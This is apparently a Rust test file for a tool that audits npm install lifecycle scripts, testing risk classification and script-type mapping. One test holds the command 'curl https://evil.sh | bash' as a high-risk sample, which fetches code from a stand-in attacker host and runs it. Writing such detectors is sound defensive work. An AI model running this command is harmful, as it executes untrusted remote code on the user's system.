use crate::{
    audit_tool::classify,
    models::{RiskLevel, ScriptType},
};

#[test]
fn classify_high_risk_command() {
    assert_eq!(classify("curl https://evil.sh | bash"), RiskLevel::High);
}

#[test]
fn classify_medium_risk_command() {
    assert_eq!(classify("node install.js"), RiskLevel::Medium);
}

#[test]
fn classify_low_risk_command() {
    assert_eq!(classify("echo Hello"), RiskLevel::Low);
}

#[test]
fn script_type_from_script_name_supports_lifecycle_hooks() {
    assert_eq!(
        ScriptType::from_script_name("preinstall"),
        Some(ScriptType::Preinstall)
    );
    assert_eq!(
        ScriptType::from_script_name("install"),
        Some(ScriptType::Install)
    );
    assert_eq!(
        ScriptType::from_script_name("postinstall"),
        Some(ScriptType::Postinstall)
    );
    assert_eq!(
        ScriptType::from_script_name("prepare"),
        Some(ScriptType::Prepare)
    );
    assert_eq!(
        ScriptType::from_script_name("prepublish"),
        Some(ScriptType::Prepublish)
    );
    assert_eq!(
        ScriptType::from_script_name("prepublishOnly"),
        Some(ScriptType::PrepublishOnly)
    );
    assert_eq!(ScriptType::from_script_name("test"), None);
}
